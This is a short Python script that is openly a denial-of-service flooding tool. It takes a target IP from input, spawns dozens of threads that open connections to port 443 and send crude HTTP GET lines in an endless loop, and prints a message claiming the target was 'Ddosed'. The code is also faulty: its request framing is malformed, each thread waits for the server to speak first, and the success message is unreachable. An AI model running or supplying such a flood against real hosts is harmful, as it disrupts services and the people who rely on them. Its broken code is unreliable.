import socket
import threading

try:
	ip = input("target's IP: ");


	data = "GET /" + ip + " HTTP/1.1\r\r"
	requests = 0

	def send():
		global data
		global requests

		while True: 
			s = socket.socket(); 
			s.connect((ip, 443))
			info = s.recv(1024).decode("utf-8")
			if info:
				s.sendto((data).encode("utf-8"), (ip, 443))
				s.sendto(("Host: 33.234.12.190 \r\n\r\n").encode("utf-8"), (ip, 443))
				s.close()
				print(f"{requests} sent till yet")
				requests += 1
				#info = s.recv(1024).decode("utf-8")
				#print(info)
			else:
				print(f"pass valid IP.");	

	for a in range(50):
		thread = threading.Thread(target=send)
		thread.start()
	send()
	print(f"you have successfully Ddosed {ip}")
except:
	print("something went wrong!");	